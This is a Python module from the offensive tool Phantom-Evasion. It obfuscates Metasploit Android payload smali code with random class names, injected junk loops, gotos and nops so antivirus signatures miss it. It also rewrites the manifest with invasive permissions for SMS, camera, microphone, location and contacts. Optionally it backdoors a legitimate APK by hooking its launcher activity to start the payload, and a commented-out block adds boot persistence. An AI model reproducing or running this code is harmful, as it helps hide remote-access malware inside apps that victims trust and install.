#!/usr/bin/env python


     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################


import sys
import os
import random
import string
from random import shuffle

def varname_creator():
    varname = ""
    Adam = random.randint(4,8)
    Eve = random.randint(12,16)
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(random.randint(Adam,Eve)))
    return varname



def injectcounters(filename): # edit method with zero local registers
    smalifile = open(filename, "r")
    new_smali = ""
    locals_reg = ""
    edit_method = False
    edit=False
    for line in smalifile:

        if (".method" in line) and (("native" not in line and "abstract" not in line) and not edit_method):

            new_smali += line
            edit_method = True

        elif ".locals" in line and ((line.split()[1] == "0") and edit_method):
          
            RandCond=varname_creator()
            RandGoto=varname_creator()
            hexlist="0123456789abcdef"

            RandNumb= str(random.randint(1,9)) + hexlist[(random.randint(1,15))] + hexlist[(random.randint(1,15))] + hexlist[(random.randint(1,15))]

            edit=True
            line=line.replace(".locals 0",".locals 2")
            new_smali += line
            new_smali += "    const/16 v0, 0x" + RandNumb + "\n"
            new_smali += "    const/16 v1, 0x0\n"
            new_smali += "    :" + RandGoto + "\n"
            new_smali += "    if-ne v0, v1, :" + RandCond + "\n"

        elif ".end method" in line and (edit_method and edit):

            new_smali += "    :" + RandCond + "\n"
            new_smali += "    add-int/lit8 v1, v1, 0x1\n"
            new_smali += "    goto/32 :" + RandGoto + "\n"
            new_smali += line 
            edit_method = False
            edit=False
        else:
            new_smali += line
		
    with open(filename, "w") as smalifile:
        smalifile.write(new_smali)

def injectgoto(filename):

    smalifile = open(filename, "r")
    new_smali = ""
    edit_method = False

    for line in smalifile:
        if (".method" in line) and (("native" not in line and "abstract" not in line) and not edit_method):

            new_smali += line
            new_smali += "    goto/32 :CFGGoto2\n"
            new_smali += "    :CFGGoto1\n"
            edit_method = True

        elif ".end method" in line and edit_method:

            new_smali += "    :CFGGoto2\n"
            new_smali += "    goto/32 :CFGGoto1\n"
            new_smali += line
            edit_method = False

        else:
            new_smali += line
		
    with open(filename, "w") as smalifile:
        smalifile.write(new_smali)
   

def injectnops(filename):

    inject_points = ["move/from16","move/16","move-wide","move-wide/from16","move-object","move-object/from16","move-object/16","move-result","move-result-object","move-result-wide","return-void","return","return-wide","return-object","const/16","const/4","const","const/high16","const-wide/16","const-wide/32","const-string","const-string/jumbo","const-class","monitor-enter","monitor-exit","instance-of","array-length","new-instance","new-array","filled-new-array","filled-new-array/range","if-eq","if-ne","if-lt","if-ge","iput-short","sget-object","sput-object","goto","cmpl-float","cmpg-float","cmpl-double","cmpg-double","cmp-long","if-gt","if-le","if-eqz","if-nez","if-ltz","if-gez","if-gtz","if-lez","aget","aput","iget","iput","sget","sput","neg-int","not-int","neg-long","not-long","neg-float","neg-double","int-to-long","int-to-float","int-to-double","long-to-int","long-to-float","long-to-double","float-to-int","float-to-long","float-to-double","double-to-int","double-to-long","double-to-float","int-to-byte","int-to-char","int-to-short","add-int","sub-int","mul-int","div-int","rem-int","and-int","or-int","xor-int","shl-int","shr-int","ushr-int","add-long","sub-long","mul-long","div-long","rem-long","and-long","or-long","xor-long","shl-long","shr-long","ushr-long","add-float","sub-float","mul-float","div-float","rem-float","add-double","sub-double","mul-double","div-double","rem-double","add-int/2addr","sub-int/2add","mul-int/2addr","div-int/2addr","rem-int/2addr","and-int/2addr","or-int/2addr","xor-int/2addr","shl-int/2addr","shr-int/2addr","ushr-int/2addr","add-long/2addr","sub-long/2addr","mul-long/2addr","div-long/2addr","rem-long/2addr","and-long/2addr","add-float/2addr","sub-float/2addr","mul-float/2addr","div-float/2addr","mul-int/lit16","div-int/lit16","rem-int/lit16","and-int/lit16","or-int/lit16","xor-int/lit16","add-int/lit8","rsub-int/lit8","mul-int/lit8","div-int/lit8"] 

    index_inject_points=len(inject_points)
    smalifile = open(filename, "r")
    new_smali = ""
    for line in smalifile:
        new_smali += line 
        for inj in range(0,index_inject_points-1):
            check_op = str(inject_points[inj])
            check_op = check_op.replace("'","")
            if check_op in line :
                num = random.randint(1,3)
                nops = "\nnop"* num
                nops += "\n"
                new_smali += nops

    new_smali=str(new_smali)		
    with open(filename, "w") as smalifile:
        smalifile.write(new_smali)

def msfvenom_smali_obfuscator(filename,ModOpt):

    smalifile = open(filename, "r")
    new_smali = ""
    for line in smalifile:
        line=line.replace("metasploit",ModOpt["Metaspl"])
        line=line.replace("stage",ModOpt["Stage"])
        line=line.replace("Payload",ModOpt["Pay"])
        line=line.replace("MainActivity",ModOpt["MainActivity"])
        line=line.replace("MainService",ModOpt["MainService"])
        line=line.replace("MainBroadcastReceiver",ModOpt["MainBroadcastReceiver"])
        new_smali += line

    with open(filename, "w") as smalifile:
        smalifile.write(new_smali)
    
def manifest_adjust(filename,ModOpt):
    manifest = open(filename, "r")
    new_manifest = ""
    all_permissions = ""
    find_permissions=False
    for line in manifest:
        if "platformBuildVersionCode=\"10\"" in line:
           new_build_version="platformBuildVersionCode=" + "\"" + str(random.randint(1,100)) + "\""
           new_build_version_name="platformBuildVersionName=" + "\"" + str(random.randint(1,10)) + "." + str(random.randint(0,9)) + "\""
           line=line.replace("platformBuildVersionCode=\"10\"",new_build_version)
           line=line.replace("platformBuildVersionName=\"2.3.3\"",new_build_version_name)

        if "uses-permission" in line:
            find_permissions = True
                
        elif "uses-permission" not in line and find_permissions :
            all_permissions = permissions_shuffler()
            new_manifest += all_permissions
            new_manifest += line
            find_permissions = False
        else:
            line=line.replace("com.metasploit.stage","com." + ModOpt["Metaspl"] + "." + ModOpt["Stage"])
            line=line.replace("metasploit",ModOpt["Metaspl"])
            line=line.replace("MainActivity",ModOpt["MainActivity"])
            line=line.replace("MainService",ModOpt["MainService"])
            line=line.replace("MainBroadcastReceiver",ModOpt["MainBroadcastReceiver"])
            new_manifest += line

    with open(filename, "w") as apk_manifest :
        apk_manifest.write(new_manifest)



def permissions_shuffler():
    permissions=["ACCESS_FINE_LOCATION","SET_WALLPAPER","RECEIVE_SMS","CAMERA","ACCESS_COARSE_LOCATION","SEND_SMS","RECORD_AUDIO","WRITE_EXTERNAL_STORAGE","RECEIVE_BOOT_COMPLETED","CHANGE_WIFI_STATE","WRITE_CALL_LOG","READ_PHONE_STATE","RECORD_AUDIO","ACCESS_WIFI_STATE","READ_SMS","WAKE_LOCK","WRITE_CONTACTS","READ_CONTACTS","WRITE_SETTINGS","READ_CALL_LOG","CALL_PHONE","INTERNET","ACCESS_NETWORK_STATE"]
    shuffle(permissions)
    shuffle_perm = ""
    for index in range(0,len(permissions)):
        shuffle_perm += "    <uses-permission android:name=\"android.permission." + permissions[index] + "\"/>\n"
    return shuffle_perm


#def inject_in_apk(apkfolder,ModOpt["MainActivity"],ModOpt["MainBroadcastReceiver"],ModOpt["MainService"],ModOpt["Metaspl"],ModOpt["Stage"],ModOpt["Pay"]): 

def inject_in_apk(ModOpt): 

    apk_xml = open("apk_smali/AndroidManifest.xml", "r")
    apk_manifest=""

    for line in apk_xml:

        apk_manifest+=line

    apk_xml.close()
    apk_manifest= apk_manifest.splitlines()
    find_permissions = False
    edit_manifest = True
    new_manifest = ""

    for i in range(0,len(apk_manifest)):
        if "uses-permission" in apk_manifest[i]:
            find_permissions = True
                
        elif "uses-permission" not in apk_manifest[i] and find_permissions :
            all_permissions = permissions_shuffler()
            new_manifest += all_permissions
            new_manifest += apk_manifest[i] + "\n"
            find_permissions = False

        #elif "</application>" in apk_manifest[i] and edit_manifest and ModOpt["RebootPersistence"]:

        #    manifest_hook = "        <receiver android:label=\"" + ModOpt["MainBroadcastReceiver"] + "\" android:name=\"com." + ModOpt["Metaspl"] + "." + ModOpt["Stage"] + "." + ModOpt["MainBroadcastReceiver"] + "\">\n"
        #    manifest_hook += "            <intent-filter>\n"
        #    manifest_hook += "                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\n"
        #    manifest_hook += "            </intent-filter>\n"
        #    manifest_hook += "        </receiver>\n"
        #    manifest_hook += "        <service android:enabled=\"true\" android:exported=\"true\" android:name=\"com" + "." + ModOpt["Metaspl"] + "." + ModOpt["Stage"] + "." + ModOpt["MainActivity"] + "\"/>\n"
        #    manifest_hook += "    </application>\n"

        #    new_manifest += manifest_hook
        #    ModOpt["RebootPersistence"] = False

        elif "<activity" in apk_manifest[i] and (((("android:name=" in apk_manifest[i] and "<intent-filter>" in apk_manifest[i+1]) and "<action android:name=\"android.intent.action.MAIN\"/>" in apk_manifest[i+2]) and "<category android:name=\"android.intent.category.LAUNCHER\"/>" in apk_manifest[i+3]) and edit_manifest and ModOpt["RunOnAppStart"]):

            new_manifest += apk_manifest[i] + "\n"

            FindHookFile=apk_manifest[i].split()

            for line in FindHookFile:

                if "android:name=" in line:
                    HookFile = "apk_smali/smali/" + (((line.replace("android:name=","")).replace("\"","")).replace(".","/")).replace(">","") + ".smali"
                    FindHook = open(HookFile, "r")
                    new_smali=""

                    for line in FindHook:
                        if "invoke-super" in line and "onCreate(Landroid/os/Bundle;)V" in line:

                            line +="\n    invoke-static {p0}, Lcom/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"] + "/" + ModOpt["Pay"] + ";->start(Landroid/content/Context;)V"
                        new_smali+=line

                    FindHook.close()

                    with open(HookFile, "w") as hooked_smali :

                        hooked_smali.write(new_smali)
                        hooked_smali.close()

            ModOpt["RunOnAppStart"] = False

        else:
            new_manifest += apk_manifest[i] + "\n"  
            
    with open("apk_smali/AndroidManifest.xml","w") as xml_manifest :

        xml_manifest.write(new_manifest)

    #os.remove("msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"] + "/" + ModOpt["MainActivity"] + ".smali")  
    os.makedirs("apk_smali/smali/com/" + ModOpt["Metaspl"])         
    os.rename("msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"],"apk_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"])

#def smali_evasion(directory,apktobackdoor):
def ApkSmaliObfuscator_android(ModOpt):
    ModOpt["Metaspl"]=varname_creator()
    ModOpt["Stage"]=varname_creator()
    ModOpt["Pay"]=varname_creator()
    ModOpt["MainActivity"]=varname_creator()
    ModOpt["MainService"]=varname_creator()
    ModOpt["MainBroadcastReceiver"]=varname_creator()

    #Appname=varname_creator()
    #fd = open(directory + "/res/values/strings.xml","r")
    #newstrn = ""
    #for line in fd:
    #    line=line.replace("MainActivity",Appname)
    #    newstrn += line

    #with open(directory +"/res/values/strings.xml","w") as strn :
    #    strn.write(newstrn)   
    os.rename("msf_smali/smali/com/metasploit","msf_smali/smali/com/" + ModOpt["Metaspl"])
    os.rename("msf_smali/smali/com/" + ModOpt["Metaspl"] + "/stage","msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"])
    os.rename("msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"] + "/Payload.smali","msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"] + "/" + ModOpt["Pay"] + ".smali")
    os.rename("msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"] + "/MainActivity.smali","msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"] + "/" + ModOpt["MainActivity"] + ".smali")
    os.rename("msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"] + "/MainService.smali","msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"] + "/" + ModOpt["MainService"] + ".smali")
    os.rename("msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"] + "/MainBroadcastReceiver.smali","msf_smali/smali/com/" + ModOpt["Metaspl"] + "/" + ModOpt["Stage"] + "/" + ModOpt["MainBroadcastReceiver"] + ".smali")
    
    manifest_adjust("msf_smali/AndroidManifest.xml",ModOpt)

    for dirpath, dinames, filenames in os.walk("msf_smali"):
        for filename in filter(lambda x: x.endswith(".smali"), filenames):

            msfvenom_smali_obfuscator(os.path.join(dirpath, filename),ModOpt)
            injectcounters(os.path.join(dirpath, filename))
            injectgoto(os.path.join(dirpath, filename))
            injectnops(os.path.join(dirpath, filename))

    if ModOpt["BackdoorApk"] != False:

        inject_in_apk(ModOpt)


    

